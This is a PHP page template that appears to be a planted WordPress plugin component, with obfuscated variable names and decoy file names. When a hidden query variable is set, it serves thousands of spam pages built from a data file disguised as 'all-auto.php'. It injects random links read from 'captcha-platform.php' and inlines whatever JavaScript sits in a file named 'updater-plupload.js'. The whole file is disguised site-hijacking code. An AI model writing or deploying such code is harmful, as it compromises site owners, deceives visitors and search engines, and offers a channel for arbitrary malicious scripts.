<?php
$utgrWrcZf = intval(get_query_var('tpebepqy'));

if ($utgrWrcZf < 1 || $utgrWrcZf > 5951) return;
$mBkYd = file(plugin_dir_path(__FILE__).'all-auto.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$x4UuhopT7 = explode(';', $mBkYd[$utgrWrcZf]);
if (count($x4UuhopT7) < 2) return;
$g71CviAHax = $x4UuhopT7[0];
$kAS1OOSo  = $x4UuhopT7[1];
$nBxzAiGuE = $x4UuhopT7[2];
$zlCHJ  = $x4UuhopT7[3];
$gmAH36 = $x4UuhopT7[4];
set_query_var('kcayssxv', $g71CviAHax);

$svxZP8eAw = '';
$nIAc23I = plugin_dir_path(__FILE__).'captcha-platform.php';
if (is_file($nIAc23I)) {
	$xeLBK = file($nIAc23I, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($xeLBK);
	shuffle($xeLBK);
	$qvrPMB = mt_rand(2, 5);
	if (count($xeLBK) > $qvrPMB) {
		for ($l1aXc = 0; $l1aXc < $qvrPMB; $l1aXc++) {
			$vWImkn8 = array_shift($xeLBK);
			$svxZP8eAw .= '<p><a href="'.$vWImkn8.'">'.$vWImkn8.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $g71CviAHax; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $kAS1OOSo . "</p>\n";
				if (strlen($zlCHJ) > 0) echo "<p>" . $zlCHJ . "</p>\n";
				if (strlen($nBxzAiGuE) > 0) echo "<p>" . $nBxzAiGuE . "</p>\n";
				if (strlen($gmAH36) > 0) echo '<p><a href="#"><img src="'.$gmAH36.'"></a>' . "</p>\n";
				echo $svxZP8eAw;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$pnxnJQhp = plugin_dir_path(__FILE__) . 'updater-plupload.js';
if (is_file($pnxnJQhp)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($pnxnJQhp);
	echo '</script>';
}
get_footer();
?>
